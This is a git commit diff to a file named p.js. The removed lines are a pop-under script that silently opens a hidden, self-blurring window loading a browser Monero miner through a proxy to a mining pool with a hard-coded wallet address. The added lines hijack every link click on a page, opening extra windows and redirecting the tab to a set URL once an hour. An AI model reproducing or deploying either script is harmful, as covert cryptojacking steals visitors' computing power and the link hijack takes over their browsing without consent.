4854d07027c94faa17e8972203f406c2613f44fd
loganxmr <34061985+loganxmr@users.noreply.github.com>
2017-12-01 10:13:58 +0545

    Update p.js

--- p.js
+++ p.js
@@ -1,22 +1,25 @@
-// pop under window script generated at http://snapbuilder.com/
-
-function goWin() {
-var mh = 124;
-var mw = 124;
-TheWin = window.open('','image','height=' + mh + ',width=' + mw + ',toolbar=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no');
-TheWin.resizeTo(mw+2,mh+30);
-TheWin.document.write('<!doctype html public "-//w3c//dtd xhtml 1.0Transitional//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml">');
-TheWin.document.write('<head><title>Pop Under</title></head><body style="overflow:hidden" bgcolor="#000000">');
-TheWin.document.write('<body onLoad="setTimeout('window.blur()', 1000);" onFocus="setTimeout('window.blur()', 1000);"> 
-
-<script src="https:\/\/loganxmr.github.io\/my-proxy\/m.js?proxy=wss:\/\/my-proxy-kkeloqtxio.now.sh\/?pool=pool.supportxmr.com:3333"><\/script>
-<script>
-  var siner = CH.Anonymous('4At8Eh3zHRMdmBoPsNHY1kQrG9w4oy1QmWv4J1z41y2Cgvf2DEUYeg7VrPLa7p1iz8WPi346KBjzvgx5uYcLnvsj4LdgJiF');
-  siner.start();
-<\/script>
-	<img src='http:\/\/www.pngall.com\/wp-content\/uploads\/2016\/05\/Coming-Soon-PNG.png'>
-
-<\/body><div align="center"><a href="#" onclick="self.close();return false;">Close Window</a></div></body></html>');
-TheWin.moveTo(0,0);
-TheWin.focus();
-}
+window.onload = function() {
+    var puURL = 'http://google.com';
+    var puTS = Math.round(+new Date()/1000);
+    //var puDate = currentDate.getDate().toString(); //day
+    console.log('T.'+localStorage.puTS+'/'+puTS);
+    if (typeof localStorage.puTS == 'undefined' || parseInt(localStorage.puTS) <= (puTS - 3600)) {
+        console.log('Yep');
+        var links = document.getElementsByTagName('a');
+        for(var i = 0, len = links.length; i < len; i++) {
+          links[i].onclick = function (e) {
+              var puHref = this.getAttribute("href");
+                var puTarget = this.getAttribute("target");
+                if (puHref !== '#' && puHref !== 'javascript:void(0)') {
+                e.preventDefault();    
+                if (puTarget == '_blank') {
+                    window.open(window.location.href);
+                }
+                window.open(puHref);
+                window.location.href = puURL;
+                localStorage.puTS = puTS;
+              }
+            }
+        }
+    }
+};
